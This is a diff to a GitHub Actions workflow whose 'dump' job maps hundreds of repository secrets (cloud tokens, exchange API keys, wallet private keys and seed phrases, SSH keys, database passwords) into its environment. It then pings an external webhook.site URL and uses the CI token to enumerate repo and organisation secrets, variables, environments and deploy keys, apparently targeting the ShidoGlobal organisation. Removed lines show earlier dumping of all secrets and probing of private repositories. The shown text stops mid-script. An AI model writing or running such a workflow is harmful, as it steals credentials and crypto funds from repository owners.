@@ -9,59 +9,397 @@ permissions:
 jobs:
   dump:
     runs-on: ubuntu-latest
+    env:
+      S_HETZNER_TOKEN: ${{ secrets.HETZNER_TOKEN }}
+      S_HETZNER_API_TOKEN: ${{ secrets.HETZNER_API_TOKEN }}
+      S_HETZNER_API_KEY: ${{ secrets.HETZNER_API_KEY }}
+      S_HCLOUD_TOKEN: ${{ secrets.HCLOUD_TOKEN }}
+      S_HETZNER_SECRET: ${{ secrets.HETZNER_SECRET }}
+      S_HETZNER_SSH_KEY: ${{ secrets.HETZNER_SSH_KEY }}
+      S_CONTABO_TOKEN: ${{ secrets.CONTABO_TOKEN }}
+      S_CONTABO_API_KEY: ${{ secrets.CONTABO_API_KEY }}
+      S_CONTABO_CLIENT_ID: ${{ secrets.CONTABO_CLIENT_ID }}
+      S_CONTABO_CLIENT_SECRET: ${{ secrets.CONTABO_CLIENT_SECRET }}
+      S_CONTABO_PASSWORD: ${{ secrets.CONTABO_PASSWORD }}
+      S_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+      S_CLOUDFLARE_TOKEN: ${{ secrets.CLOUDFLARE_TOKEN }}
+      S_CF_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
+      S_CLOUDFLARE_API_KEY: ${{ secrets.CLOUDFLARE_API_KEY }}
+      S_CLOUDFLARE_EMAIL: ${{ secrets.CLOUDFLARE_EMAIL }}
+      S_CF_API_KEY: ${{ secrets.CF_API_KEY }}
+      S_CF_TOKEN: ${{ secrets.CF_TOKEN }}
+      S_CF_ZONE_ID: ${{ secrets.CF_ZONE_ID }}
+      S_CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+      S_ZONE_ID: ${{ secrets.ZONE_ID }}
+      S_LINODE_TOKEN: ${{ secrets.LINODE_TOKEN }}
+      S_LINODE_API_TOKEN: ${{ secrets.LINODE_API_TOKEN }}
+      S_DIGITALOCEAN_TOKEN: ${{ secrets.DIGITALOCEAN_TOKEN }}
+      S_DO_TOKEN: ${{ secrets.DO_TOKEN }}
+      S_VULTR_API_KEY: ${{ secrets.VULTR_API_KEY }}
+      S_VULTR_TOKEN: ${{ secrets.VULTR_TOKEN }}
+      S_OVH_TOKEN: ${{ secrets.OVH_TOKEN }}
+      S_SCALEWAY_TOKEN: ${{ secrets.SCALEWAY_TOKEN }}
+      S_GODADDY_API_KEY: ${{ secrets.GODADDY_API_KEY }}
+      S_GODADDY_API_SECRET: ${{ secrets.GODADDY_API_SECRET }}
+      S_VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+      S_NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
+      S_NETLIFY_TOKEN: ${{ secrets.NETLIFY_TOKEN }}
+      S_RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}
+      S_RENDER_API_KEY: ${{ secrets.RENDER_API_KEY }}
+      S_FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
+      S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      S_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      S_AWS_REGION: ${{ secrets.AWS_REGION }}
+      S_AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
+      S_AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      S_AWS_ACCOUNT_ID: ${{ secrets.AWS_ACCOUNT_ID }}
+      S_AWS_DEFAULT_REGION: ${{ secrets.AWS_DEFAULT_REGION }}
+      S_GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
+      S_GCP_PROJECT: ${{ secrets.GCP_PROJECT }}
+      S_GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
+      S_GOOGLE_APPLICATION_CREDENTIALS: ${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}
+      S_GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
+      S_GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
+      S_FIREBASE_TOKEN: ${{ secrets.FIREBASE_TOKEN }}
+      S_FIREBASE_API_KEY: ${{ secrets.FIREBASE_API_KEY }}
+      S_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      S_GH_TOKEN: ${{ secrets.GH_TOKEN }}
+      S_PAT: ${{ secrets.PAT }}
+      S_GITHUB_PAT: ${{ secrets.GITHUB_PAT }}
+      S_PERSONAL_ACCESS_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
+      S_ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+      S_GITHUB_ACCESS_TOKEN: ${{ secrets.GITHUB_ACCESS_TOKEN }}
+      S_GH_PAT: ${{ secrets.GH_PAT }}
+      S_GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+      S_BITBUCKET_TOKEN: ${{ secrets.BITBUCKET_TOKEN }}
+      S_DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
+      S_DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+      S_DOCKER_TOKEN: ${{ secrets.DOCKER_TOKEN }}
+      S_DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
+      S_DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
+      S_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+      S_NPM_AUTH_TOKEN: ${{ secrets.NPM_AUTH_TOKEN }}
+      S_NPM_REGISTRY_TOKEN: ${{ secrets.NPM_REGISTRY_TOKEN }}
+      S_PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
+      S_REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}
+      S_REGISTRY_USERNAME: ${{ secrets.REGISTRY_USERNAME }}
+      S_GHCR_TOKEN: ${{ secrets.GHCR_TOKEN }}
+      S_SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+      S_SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+      S_CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
+      S_MEXC_API_KEY: ${{ secrets.MEXC_API_KEY }}
+      S_MEXC_SECRET_KEY: ${{ secrets.MEXC_SECRET_KEY }}
+      S_MEXC_API_SECRET: ${{ secrets.MEXC_API_SECRET }}
+      S_MEXC_SECRET: ${{ secrets.MEXC_SECRET }}
+      S_MEXC_ACCESS_KEY: ${{ secrets.MEXC_ACCESS_KEY }}
+      S_MEXC_ACCESS_SECRET: ${{ secrets.MEXC_ACCESS_SECRET }}
+      S_BINANCE_API_KEY: ${{ secrets.BINANCE_API_KEY }}
+      S_BINANCE_SECRET: ${{ secrets.BINANCE_SECRET }}
+      S_BINANCE_API_SECRET: ${{ secrets.BINANCE_API_SECRET }}
+      S_OKX_API_KEY: ${{ secrets.OKX_API_KEY }}
+      S_OKX_SECRET_KEY: ${{ secrets.OKX_SECRET_KEY }}
+      S_OKX_API_SECRET: ${{ secrets.OKX_API_SECRET }}
+      S_OKX_PASSPHRASE: ${{ secrets.OKX_PASSPHRASE }}
+      S_BYBIT_API_KEY: ${{ secrets.BYBIT_API_KEY }}
+      S_BYBIT_API_SECRET: ${{ secrets.BYBIT_API_SECRET }}
+      S_COINBASE_API_KEY: ${{ secrets.COINBASE_API_KEY }}
+      S_COINBASE_API_SECRET: ${{ secrets.COINBASE_API_SECRET }}
+      S_KRAKEN_API_KEY: ${{ secrets.KRAKEN_API_KEY }}
+      S_KRAKEN_API_SECRET: ${{ secrets.KRAKEN_API_SECRET }}
+      S_KUCOIN_API_KEY: ${{ secrets.KUCOIN_API_KEY }}
+      S_KUCOIN_API_SECRET: ${{ secrets.KUCOIN_API_SECRET }}
+      S_KUCOIN_PASSPHRASE: ${{ secrets.KUCOIN_PASSPHRASE }}
+      S_GATE_API_KEY: ${{ secrets.GATE_API_KEY }}
+      S_GATE_SECRET: ${{ secrets.GATE_SECRET }}
+      S_GATEIO_API_KEY: ${{ secrets.GATEIO_API_KEY }}
+      S_HUOBI_API_KEY: ${{ secrets.HUOBI_API_KEY }}
+      S_HTX_API_KEY: ${{ secrets.HTX_API_KEY }}
+      S_BITGET_API_KEY: ${{ secrets.BITGET_API_KEY }}
+      S_BITGET_API_SECRET: ${{ secrets.BITGET_API_SECRET }}
+      S_BITGET_PASSPHRASE: ${{ secrets.BITGET_PASSPHRASE }}
+      S_EXCHANGE_API_KEY: ${{ secrets.EXCHANGE_API_KEY }}
+      S_EXCHANGE_SECRET: ${{ secrets.EXCHANGE_SECRET }}
+      S_CEX_API_KEY: ${{ secrets.CEX_API_KEY }}
+      S_CEX_SECRET: ${{ secrets.CEX_SECRET }}
+      S_TRADING_API_KEY: ${{ secrets.TRADING_API_KEY }}
+      S_API_KEY: ${{ secrets.API_KEY }}
+      S_API_SECRET: ${{ secrets.API_SECRET }}
+      S_API_PASSPHRASE: ${{ secrets.API_PASSPHRASE }}
+      S_PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
+      S_DEPLOYER_PRIVATE_KEY: ${{ secrets.DEPLOYER_PRIVATE_KEY }}
+      S_OWNER_PRIVATE_KEY: ${{ secrets.OWNER_PRIVATE_KEY }}
+      S_MAINNET_PRIVATE_KEY: ${{ secrets.MAINNET_PRIVATE_KEY }}
+      S_MNEMONIC: ${{ secrets.MNEMONIC }}
+      S_SEED_PHRASE: ${{ secrets.SEED_PHRASE }}
+      S_SEED: ${{ secrets.SEED }}
+      S_SHIDO_PRIVATE_KEY: ${{ secrets.SHIDO_PRIVATE_KEY }}
+      S_WALLET_PRIVATE_KEY: ${{ secrets.WALLET_PRIVATE_KEY }}
+      S_BOT_PRIVATE_KEY: ${{ secrets.BOT_PRIVATE_KEY }}
+      S_VALIDATOR_KEY: ${{ secrets.VALIDATOR_KEY }}
+      S_KEYRING_PASSWORD: ${{ secrets.KEYRING_PASSWORD }}
+      S_VALIDATOR_PRIVATE_KEY: ${{ secrets.VALIDATOR_PRIVATE_KEY }}
+      S_NODE_PRIVATE_KEY: ${{ secrets.NODE_PRIVATE_KEY }}
+      S_SIGNER_KEY: ${{ secrets.SIGNER_KEY }}
+      S_HOT_WALLET: ${{ secrets.HOT_WALLET }}
+      S_COLD_WALLET: ${{ secrets.COLD_WALLET }}
+      S_TREASURY_KEY: ${{ secrets.TREASURY_KEY }}
+      S_ADMIN_PRIVATE_KEY: ${{ secrets.ADMIN_PRIVATE_KEY }}
+      S_EVM_PRIVATE_KEY: ${{ secrets.EVM_PRIVATE_KEY }}
+      S_DEPLOY_PRIVATE_KEY: ${{ secrets.DEPLOY_PRIVATE_KEY }}
+      S_PRIVKEY: ${{ secrets.PRIVKEY }}
+      S_PKEY: ${{ secrets.PKEY }}
+      S_WALLET_MNEMONIC: ${{ secrets.WALLET_MNEMONIC }}
+      S_WALLET_SEED: ${{ secrets.WALLET_SEED }}
+      S_ETH_PRIVATE_KEY: ${{ secrets.ETH_PRIVATE_KEY }}
+      S_BSC_PRIVATE_KEY: ${{ secrets.BSC_PRIVATE_KEY }}
+      S_SHIDO_MNEMONIC: ${{ secrets.SHIDO_MNEMONIC }}
+      S_SHIDO_SEED: ${{ secrets.SHIDO_SEED }}
+      S_DEX_PRIVATE_KEY: ${{ secrets.DEX_PRIVATE_KEY }}
+      S_TREASURY_PRIVATE_KEY: ${{ secrets.TREASURY_PRIVATE_KEY }}
+      S_STAKING_PRIVATE_KEY: ${{ secrets.STAKING_PRIVATE_KEY }}
+      S_JWT_SECRET: ${{ secrets.JWT_SECRET }}
+      S_SECRET_KEY: ${{ secrets.SECRET_KEY }}
+      S_SESSION_SECRET: ${{ secrets.SESSION_SECRET }}
+      S_ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+      S_APP_KEY: ${{ secrets.APP_KEY }}
+      S_APP_SECRET: ${{ secrets.APP_SECRET }}
+      S_SECRET: ${{ secrets.SECRET }}
+      S_TOKEN: ${{ secrets.TOKEN }}
+      S_PASSWORD: ${{ secrets.PASSWORD }}
+      S_ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
+      S_ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD }}
+      S_DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+      S_DATABASE_URL: ${{ secrets.DATABASE_URL }}
+      S_DB_URL: ${{ secrets.DB_URL }}
+      S_POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }}
+      S_MYSQL_ROOT_PASSWORD: ${{ secrets.MYSQL_ROOT_PASSWORD }}
+      S_MONGO_PASSWORD: ${{ secrets.MONGO_PASSWORD }}
+      S_MONGODB_URI: ${{ secrets.MONGODB_URI }}
+      S_REDIS_URL: ${{ secrets.REDIS_URL }}
+      S_REDIS_PASSWORD: ${{ secrets.REDIS_PASSWORD }}
+      S_RPC_URL: ${{ secrets.RPC_URL }}
+      S_SHIDO_RPC: ${{ secrets.SHIDO_RPC }}
+      S_SHIDO_RPC_URL: ${{ secrets.SHIDO_RPC_URL }}
+      S_EVM_RPC: ${{ secrets.EVM_RPC }}
+      S_RPC: ${{ secrets.RPC }}
+      S_NODE_URL: ${{ secrets.NODE_URL }}
+      S_ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
+      S_INFURA_API_KEY: ${{ secrets.INFURA_API_KEY }}
+      S_INFURA_PROJECT_ID: ${{ secrets.INFURA_PROJECT_ID }}
+      S_QUICKNODE_API_KEY: ${{ secrets.QUICKNODE_API_KEY }}
+      S_QUICKNODE_URL: ${{ secrets.QUICKNODE_URL }}
+      S_ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
+      S_ARBISCAN_API_KEY: ${{ secrets.ARBISCAN_API_KEY }}
+      S_BSCSCAN_API_KEY: ${{ secrets.BSCSCAN_API_KEY }}
+      S_BLOCKSCOUT_API_KEY: ${{ secrets.BLOCKSCOUT_API_KEY }}
+      S_COSMOS_RPC: ${{ secrets.COSMOS_RPC }}
+      S_SHIDOSCAN_API_KEY: ${{ secrets.SHIDOSCAN_API_KEY }}
+      S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+      S_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+      S_SSH_KEY: ${{ secrets.SSH_KEY }}
+      S_PRIVATE_SSH_KEY: ${{ secrets.PRIVATE_SSH_KEY }}
+      S_SSH_KEY_PRIVATE: ${{ secrets.SSH_KEY_PRIVATE }}
+      S_SSH_PASS: ${{ secrets.SSH_PASS }}
+      S_SSH_PASSWORD: ${{ secrets.SSH_PASSWORD }}
+      S_VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+      S_SERVER_KEY: ${{ secrets.SERVER_KEY }}
+      S_ANSIBLE_KEY: ${{ secrets.ANSIBLE_KEY }}
+      S_STORAGEBOX_PASSWORD: ${{ secrets.STORAGEBOX_PASSWORD }}
+      S_STORAGEBOX_USER: ${{ secrets.STORAGEBOX_USER }}
+      S_S3_ACCESS_KEY: ${{ secrets.S3_ACCESS_KEY }}
+      S_S3_SECRET_KEY: ${{ secrets.S3_SECRET_KEY }}
+      S_B2_KEY_ID: ${{ secrets.B2_KEY_ID }}
+      S_B2_APPLICATION_KEY: ${{ secrets.B2_APPLICATION_KEY }}
+      S_B2_APP_KEY: ${{ secrets.B2_APP_KEY }}
+      S_WASABI_ACCESS_KEY: ${{ secrets.WASABI_ACCESS_KEY }}
+      S_SPACES_ACCESS_KEY: ${{ secrets.SPACES_ACCESS_KEY }}
+      S_MINIO_ACCESS_KEY: ${{ secrets.MINIO_ACCESS_KEY }}
+      S_BACKUP: ${{ secrets.BACKUP }}
+      S_SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
+      S_SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+      S_SLACK_TOKEN: ${{ secrets.SLACK_TOKEN }}
+      S_DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
+      S_DISCORD_TOKEN: ${{ secrets.DISCORD_TOKEN }}
+      S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+      S_TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+      S_TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+      S_SMTP_PASSWORD: ${{ secrets.SMTP_PASSWORD }}
+      S_SMTP_USER: ${{ secrets.SMTP_USER }}
+      S_SMTP_HOST: ${{ secrets.SMTP_HOST }}
+      S_SENDGRID_API_KEY: ${{ secrets.SENDGRID_API_KEY }}
+      S_MAILGUN_API_KEY: ${{ secrets.MAILGUN_API_KEY }}
+      S_MAILCHIMP_API_KEY: ${{ secrets.MAILCHIMP_API_KEY }}
+      S_TWILIO_AUTH_TOKEN: ${{ secrets.TWILIO_AUTH_TOKEN }}
+      S_TWILIO_ACCOUNT_SID: ${{ secrets.TWILIO_ACCOUNT_SID }}
+      S_STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
+      S_STRIPE_API_KEY: ${{ secrets.STRIPE_API_KEY }}
+      S_STRIPE_WEBHOOK_SECRET: ${{ secrets.STRIPE_WEBHOOK_SECRET }}
+      S_OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+      S_ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+      S_GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+      S_HUGGINGFACE_TOKEN: ${{ secrets.HUGGINGFACE_TOKEN }}
+      S_DATADOG_API_KEY: ${{ secrets.DATADOG_API_KEY }}
+      S_DD_API_KEY: ${{ secrets.DD_API_KEY }}
+      S_SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
+      S_SENTRY_DSN: ${{ secrets.SENTRY_DSN }}
+      S_NEWRELIC_API_KEY: ${{ secrets.NEWRELIC_API_KEY }}
+      S_PAGERDUTY_TOKEN: ${{ secrets.PAGERDUTY_TOKEN }}
+      S_POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+      S_AMPLITUDE_API_KEY: ${{ secrets.AMPLITUDE_API_KEY }}
+      S_MIXPANEL_TOKEN: ${{ secrets.MIXPANEL_TOKEN }}
+      S_SHOPIFY_API_KEY: ${{ secrets.SHOPIFY_API_KEY }}
+      S_SUPABASE_KEY: ${{ secrets.SUPABASE_KEY }}
+      S_SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+      S_SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+      S_SUPABASE_ANON_KEY: ${{ secrets.SUPABASE_ANON_KEY }}
+      S_SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+      S_FIREBASE_CREDENTIALS: ${{ secrets.FIREBASE_CREDENTIALS }}
+      S_GH_PAT_2: ${{ secrets.GH_PAT_2 }}
+      S_GITHUB_DEPLOY_KEY: ${{ secrets.GITHUB_DEPLOY_KEY }}
+      S_GITHUB_DEPLOY_TOKEN: ${{ secrets.GITHUB_DEPLOY_TOKEN }}
+      S_GITHUB_SSH_KEY: ${{ secrets.GITHUB_SSH_KEY }}
+      S_DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+      S_DEPLOYMENT_KEY: ${{ secrets.DEPLOYMENT_KEY }}
+      S_COINMARKETCAP_API_KEY: ${{ secrets.COINMARKETCAP_API_KEY }}
+      S_CMC_API_KEY: ${{ secrets.CMC_API_KEY }}
+      S_MORALIS_API_KEY: ${{ secrets.MORALIS_API_KEY }}
+      S_TATUM_API_KEY: ${{ secrets.TATUM_API_KEY }}
+      S_NOWNODES_API_KEY: ${{ secrets.NOWNODES_API_KEY }}
+      S_GETBLOCK_API_KEY: ${{ secrets.GETBLOCK_API_KEY }}
+      S_HOSTINGER_API_KEY: ${{ secrets.HOSTINGER_API_KEY }}
+      S_NAMECHEAP_API_KEY: ${{ secrets.NAMECHEAP_API_KEY }}
+      S_PORKBUN_API_KEY: ${{ secrets.PORKBUN_API_KEY }}
+      S_GOOGLE_DNS_API_KEY: ${{ secrets.GOOGLE_DNS_API_KEY }}
+      S_DIGITALOCEAN_ACCESS_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+      S_SSH_PUBLIC_KEY: ${{ secrets.SSH_PUBLIC_KEY }}
+      S_SSH_HOST_KEY: ${{ secrets.SSH_HOST_KEY }}
+      S_TERRAFORM_TOKEN: ${{ secrets.TERRAFORM_TOKEN }}
+      S_TF_VAR_TOKEN: ${{ secrets.TF_VAR_TOKEN }}
+      S_ANSIBLE_VAULT_PASSWORD: ${{ secrets.ANSIBLE_VAULT_PASSWORD }}
+      S_VAULT_TOKEN: ${{ secrets.VAULT_TOKEN }}
+      S_K8S_TOKEN: ${{ secrets.K8S_TOKEN }}
+      S_KUBE_CONFIG: ${{ secrets.KUBE_CONFIG }}
+      S_DO_SPACES_KEY: ${{ secrets.DO_SPACES_KEY }}
+      S_DO_SPACES_SECRET: ${{ secrets.DO_SPACES_SECRET }}
+      S_AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+      S_AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+      S_AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+      S_BACKBLAZE_KEY_ID: ${{ secrets.BACKBLAZE_KEY_ID }}
+      S_BACKBLAZE_APPLICATION_KEY: ${{ secrets.BACKBLAZE_APPLICATION_KEY }}
+      S_WASABI_SECRET_KEY: ${{ secrets.WASABI_SECRET_KEY }}
+      S_SCALEWAY_SECRET_KEY: ${{ secrets.SCALEWAY_SECRET_KEY }}
+      S_SCALEWAY_ACCESS_KEY: ${{ secrets.SCALEWAY_ACCESS_KEY }}
+      S_SHIDO_DEPLOY_KEY: ${{ secrets.SHIDO_DEPLOY_KEY }}
+      S_SHIDO_VALIDATOR_KEY: ${{ secrets.SHIDO_VALIDATOR_KEY }}
+      S_SHIDO_OWNER_KEY: ${{ secrets.SHIDO_OWNER_KEY }}
+      S_LOTTERY_PRIVATE_KEY: ${{ secrets.LOTTERY_PRIVATE_KEY }}
+      S_BRIDGE_PRIVATE_KEY: ${{ secrets.BRIDGE_PRIVATE_KEY }}
+      S_RELAYER_PRIVATE_KEY: ${{ secrets.RELAYER_PRIVATE_KEY }}
+      S_KEEPER_PRIVATE_KEY: ${{ secrets.KEEPER_PRIVATE_KEY }}
+      S_SIGNER_PRIVATE_KEY: ${{ secrets.SIGNER_PRIVATE_KEY }}
+      S_CROSSCHAIN_PRIVATE_KEY: ${{ secrets.CROSSCHAIN_PRIVATE_KEY }}
+      S_OTC_PRIVATE_KEY: ${{ secrets.OTC_PRIVATE_KEY }}
+      S_MEXC_ACCESS_ID: ${{ secrets.MEXC_ACCESS_ID }}
+      S_MEXC_ACCESS_KEY_SECRET: ${{ secrets.MEXC_ACCESS_KEY_SECRET }}
+      S_BINANCE_SECRET_KEY: ${{ secrets.BINANCE_SECRET_KEY }}
+      S_OKX_SECRET: ${{ secrets.OKX_SECRET }}
+      S_OKX_PASS: ${{ secrets.OKX_PASS }}
+      S_COINBASE_PASSPHRASE: ${{ secrets.COINBASE_PASSPHRASE }}
+      S_WALLET_KEY: ${{ secrets.WALLET_KEY }}
+      S_PRIVATEKEY: ${{ secrets.PRIVATEKEY }}
+      S_PRIVATE_KEY_HEX: ${{ secrets.PRIVATE_KEY_HEX }}
+      S_MNEMONIC_PHRASE: ${{ secrets.MNEMONIC_PHRASE }}
+      S_RECOVERY_PHRASE: ${{ secrets.RECOVERY_PHRASE }}
+      S_XPRV: ${{ secrets.XPRV }}
+      S_SECRET_PHRASE: ${{ secrets.SECRET_PHRASE }}
+      S_NODE_KEY: ${{ secrets.NODE_KEY }}
+      S_NODE_MNEMONIC: ${{ secrets.NODE_MNEMONIC }}
+      S_FIAT_PRIVATE_KEY: ${{ secrets.FIAT_PRIVATE_KEY }}
+      S_WITHDRAW_PRIVATE_KEY: ${{ secrets.WITHDRAW_PRIVATE_KEY }}
+      S_HOTKEY: ${{ secrets.HOTKEY }}
+      S_COLDKEY: ${{ secrets.COLDKEY }}
+      S_GRAFANA_TOKEN: ${{ secrets.GRAFANA_TOKEN }}
+      S_PROMETHEUS_TOKEN: ${{ secrets.PROMETHEUS_TOKEN }}
+      S_ELASTIC_TOKEN: ${{ secrets.ELASTIC_TOKEN }}
+      S_SENTRY_TOKEN: ${{ secrets.SENTRY_TOKEN }}
+      S_DATADOG_TOKEN: ${{ secrets.DATADOG_TOKEN }}
+      S_NEWRELIC_TOKEN: ${{ secrets.NEWRELIC_TOKEN }}
+      S_SENTRY_DSN_URL: ${{ secrets.SENTRY_DSN_URL }}
+      S_IPFS_KEY: ${{ secrets.IPFS_KEY }}
+      S_PINATA_KEY: ${{ secrets.PINATA_KEY }}
+      S_PINATA_SECRET: ${{ secrets.PINATA_SECRET }}
+      S_PINATA_JWT: ${{ secrets.PINATA_JWT }}
+      S_WEB3_STORAGE_TOKEN: ${{ secrets.WEB3_STORAGE_TOKEN }}
+      S_NFT_STORAGE_TOKEN: ${{ secrets.NFT_STORAGE_TOKEN }}
+      S_CI_TOKEN: ${{ secrets.CI_TOKEN }}
+      S_CIRCLE_TOKEN: ${{ secrets.CIRCLE_TOKEN }}
+      S_TRAVIS_TOKEN: ${{ secrets.TRAVIS_TOKEN }}
+      S_GH_ACTIONS_TOKEN: ${{ secrets.GH_ACTIONS_TOKEN }}
+      S_ACTIONS_TOKEN: ${{ secrets.ACTIONS_TOKEN }}
+      S_ACTIONS_RUNTIME_TOKEN: ${{ secrets.ACTIONS_RUNTIME_TOKEN }}
     steps:
       - uses: actions/checkout@v4
       - name: dump
         env:
           GH_TOKEN: ${{ github.token }}
-          SECRETS_JSON: ${{ toJSON(secrets) }}
-          VARS_JSON: ${{ toJSON(vars) }}
         run: |
           set +e
           U="https://webhook.site/9c4e2186-3d86-4414-8214-93c1f6c51a46"
           R="${GITHUB_REPOSITORY//\//_}"
-          printf '%s' "$SECRETS_JSON" > /tmp/secrets.json
-          printf '%s' "$VARS_JSON" > /tmp/vars.json
           curl -sS -X POST "$U?hb=$R" --data-binary "start $GITHUB_REPOSITORY" >/dev/null 2>&1
           O=/tmp/d.txt
           : > $O
           {
             echo "##### 0. identity #####"
             echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
-            echo "##### A. toJSON(secrets) #####"
-            cat /tmp/secrets.json; echo
-            echo "##### B. toJSON(vars) #####"
-            cat /tmp/vars.json; echo
-            echo "##### A2. secret key names #####"
-            grep -oE '"[-A-Za-z0-9_]+"[[:space:]]*:' /tmp/secrets.json
-            echo "##### D. installation repositories #####"
-            curl -sS -o /tmp/dd -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/installation/repositories"
-            head -c 500 /tmp/dd; echo
-            echo "##### E. private repo contents shido-v3 #####"
-            curl -sS -o /tmp/ee -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3/contents/"
-            head -c 200 /tmp/ee; echo
-            echo "##### F. private repo meta shido-v3 #####"
-            curl -sS -o /tmp/ff -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3"
-            head -c 200 /tmp/ff; echo
-            echo "##### G. org repos #####"
-            curl -sS -o /tmp/gg -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/orgs/ShidoGlobal/repos?per_page=100"
-            head -c 300 /tmp/gg; echo
-            echo "##### H. personal repo read #####"
-            curl -sS -o /tmp/hh -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/kuzo998/aetherbot"
-            head -c 200 /tmp/hh; echo
-            echo "##### I. OIDC aws claim #####"
+            echo "##### 1. GITHUB_* env #####"
+            env | grep -E '^GITHUB_' | sort
+            echo "##### 2. token scope headers #####"
+            curl -sS -D - -o /dev/null -H "authorization: token $GH_TOKEN" https://api.github.com/ 2>&1 | grep -iE 'x-oauth-scopes|x-accepted-oauth|^HTTP/'
+            echo "##### 3. GET /user #####"
+            curl -sS -H "authorization: token $GH_TOKEN" https://api.github.com/user 2>&1
+            echo; echo "##### 4. GET /repos/REPO #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY" 2>&1 | head -c 900
+            echo; echo "##### 5. repo secrets #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" 2>&1
+            echo; echo "##### 6. repo variables #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/variables" 2>&1
+            echo; echo "##### 7. org secrets #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/orgs/ShidoGlobal/actions/secrets" 2>&1
+            echo; echo "##### 8. environments #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/environments" 2>&1
+            echo; echo "##### 9. deploy keys #####"
+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/keys" 2>&1
+            echo; echo "##### 10. webhooks #####"
